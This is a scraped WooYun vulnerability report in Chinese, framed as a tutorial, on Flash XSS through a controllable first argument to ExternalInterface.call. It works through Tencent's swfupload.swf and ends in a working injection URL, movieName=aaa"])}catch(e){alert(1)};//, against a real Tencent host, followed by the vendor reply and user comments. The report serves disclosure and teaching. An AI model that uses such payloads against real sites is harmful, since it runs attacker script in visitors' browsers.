{"id": 14674, "wybug_id": "wooyun-2012-016532", "wybug_title": "[腾讯实例教程] 那些年我们一起学XSS - 15. Flash Xss进阶 [ExternalInterface.call第一个参数]", "wybug_corp": "腾讯", "wybug_author": "心伤的瘦子", "wybug_date": "2012-12-26 14:55", "wybug_open_date": "2013-02-09 14:55", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "2", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "应用安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-12-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-12-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-01-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-01-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-01-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-02-09：\t细节向公众公开  简要描述： 除了上一节讲到的navigateToURL/getURL之外呢，另一个经常存在XSS缺陷的as函数就是ExternalInterface.call，此函数作为FLASH与宿主页面javascript通信的接口，一般来说，有“2”个参数，第一个参数为所调用js函数名，后续的其他参数则为所调用的js函数的参数。那么在参数可控的情况下，不论是第一个参数或是后续参数可控，我们均能加以利用实现XSS。本节先说一说第一个参数可控的情况。 详细说明：  1. 先从程序员的角度说下基础知识，有时候，我们需要在FLASH里调用当前页面中的javascript函数，例如：一个简单的需求，我们要在游戏加载完成后，执行弹出1的操作。javascript代码:\nalert(1)\nas代码\nExternalInterface.call(\"alert\",\"1\");\n2. 有的程序员就会觉得，直接弹出1太丑了吧。于是他自己写个js的函数\nfunction myalert(str){    //显示一个漂亮的浮动层，并且把str显示在上面。}\n然后在as里\nExternalInterface.call(\"myalert\",\"1\");\n3. 又有一天，另外一个程序员觉得上面那个程序员写的东西不错，但是他的JS函数名不叫myalert，于是喊那个程序员改下as代码。于是那个程序员觉得，免得以后老是有人喊我改代码，他就将代码写成了下面这个样子。\nvar func:String=root.loaderInfo.parameters.func; //接受FLASH所带的func参数ExternalInterface.call(func,\"1\");\n这样一来，其他想用这个FLASH的人，不需要修改FLASH，只需要调用FLASH的时候带上参数即可。比如我的JS函数是newalert, 我只需要按照下面这么调用：\nhttp://some.com/xxx.swf?func=newalert\n4. 上述过程提高了程序的可重用性，为开发人员带来了极大的便利，但是却是缺乏安全考虑的。攻击者可以采用以下的方式来执行自己的代码http://some.com/xxx.swf?func=(function(){alert(\"hi jack\")})5. 为了方便理解，我们可以将\nExternalInterface.call(\"函数名\",\"参数1\");\n看成JS里的\n函数名(\"参数1\");\n而FLASH里实际最后执行的JS代码，形式如下（至于下面这句哪里来的，暂时不表）：\ntry { __flash__toXML(函数名(\"参数1\")) ; } catch (e) { \"<undefined/>\"; }\n因而 函数名 部分也可以写为  (function(){alert(\"hi jack\")}) 的形式。6. 上面说的是理论基础，有了这个基础，我们来看实例，就比较简单了。http://quan.qq.com/swf/swfupload.swf7. 怎么反编译，见上一篇。我们来看怎么查找缺陷。8. 因为这是一个AS3.0的FLASH文件，我们首先确定FLASH是否有接受参数。   as3.0 接受参数的方法，所有参数存放在 root.loaderInfo.parameters 对象里。   例如 aaa.swf?a=1&b=2&c=3,   那么  root.loaderInfo.parameters 则等于   {      \"a\":1,      \"b\":2,      \"c\":3   }9. 我们可以定位到 movieName变量\n\n可以看出，FLASH的movieName参数，存放到了this.movieName中。10.进一步， this.movieName被带入了到了this.flashReady_Callback及其它变量。\n\n\nthis.flashReady_Callback = ((\"SWFUpload.instances[\\\"\" + this.movieName) + \"\\\"].flashReady\");\n11. 我们再进一步看看，this.flashReady_Callback 被用到了哪里。\n\n12. 再接着看看调用 this.flashReady_Callback 的Simple函数是啥样子的。\n\n可以看到，最终这个参数被放到 ExternalInterface.call 的第一个参数中执行了。13. 是不是很激动。我们来假设一下，按下面调用FLASHhttp://quan.qq.com/swf/swfupload.swf?movieName=aaaaaaaa那么this.flashReady_Callback就等于以下内容。SWFUpload.instances[\"aaaaaaaa\"].flashReady最终调用的是ExternalInterface.call('SWFUpload.instances[\"aaaaaaaa\"].flashReady');14. 如果我们要调用自己的JS代码，就需要构造闭合，但是你会发现有一定问题。。我们最多能够造成下面的模样。\nExternalInterface.call('SWFUpload.instances[\"aaa\"];function SWFUpload(){};SWFUpload[\"aaa\"].flashReady');\n但是这样是无法正确执行的，因为 SWFUpload.instances没有被定义，从而SWFUpload.instances[\"aaa\"]会失败。15. 怎么办呢？这里就要拿出我们第5步里的知识了。我们把“函数名”换成call的第一个参数内容。变成下面的形式。\ntry { __flash__toXML(SWFUpload.instances[\"aaaaaaaa\"].flashReady(\"参数1\")) ; } catch (e) { \"<undefined/>\"; }\n我们再基于以上代码来构造，\ntry { __flash__toXML(SWFUpload.instances[\"aaa\"])}catch(e){alert(1)};//\"].flashReady(\"参数1\")) ; } catch (e) { \"<undefined/>\"; }\n图片解析:\n\n上面一行不好看懂的话，写的好看点。\ntry {\t__flash__toXML(SWFUpload.instances[\"aaa\"])   //此行代码，因为SWFUpload未定义，出错，跳转到catch部分}catch(e){\talert(1); //这里将会被执行。};//\"].flashReady(\"参数1\")) ; } catch (e) { \"<undefined/>\"; }\n16. 最后，我们把构造的代码，放进FLASH的参数里\nhttp://quan.qq.com/swf/swfupload.swf?movieName=aaa\"])}catch(e){alert(1)};//\n可以看到成功执行alert(1)\n\n   漏洞证明：  见详细说明。   修复方案：  对传入call的字符串进行判断或过滤操作。   版权声明：转载请注明来源 心伤的瘦子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2012-12-26 16:13 厂商回复： 非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-12-26 14:56 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  广告位招租    \n     2012-12-26 15:05 |    \t\tkobin97  \t\t\t( 核心白帽子 |\t\t\t        Rank:1754 漏洞数:190        | 关注网络安全。。)\t\t \n  广告位招租    \n     2012-12-26 15:07 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  广告位招猪    \n     2012-12-26 15:18 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  坐等全部教程公开.    \n     2012-12-26 15:31 |    \t\tAdra1n \t\t\t( 普通白帽子  |\t\t\t        Rank:437 漏洞数:68        )\t\t \n  这个牛叉了！！    \n     2012-12-26 16:02 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  @xsser 说好的关注瘦子功能呢？    \n     2012-12-26 16:14 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  @xsser 说好的追星功能呢？    \n     2012-12-26 16:15 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @疯子 今天在加了 稍安勿躁    \n     2012-12-26 16:21 |    \t\tz@cx \t\t\t( 普通白帽子  |\t\t\t        Rank:434 漏洞数:56        | 。-。-。)\t\t \n  底部广告位招租    \n     2012-12-26 23:07 |    \t\t蓝风 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:25        | 崬汸慾哓 嗼檤焄垳皁 沓猵圊屾亾沬荖 颩憬...)\t\t \n  友情链接    \n     2012-12-28 18:40 |    \t\t昵称 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 简单介绍)\t\t \n  牛叉啊    \n     2013-01-26 16:15 |    \t\t专注XSS三十年 \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:11        | 11)\t\t \n  非一般的牛……我最复杂的XSS也依然是JS的，FLASH的暂时还没研究……    \n     2013-01-26 21:38 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @专注XSS三十年 same to you、    \n     2015-05-25 12:53 |    \t\t左道diffway \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 大学狗一枚，求带啊)\t\t \n  我一路看过来的，太牛了    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}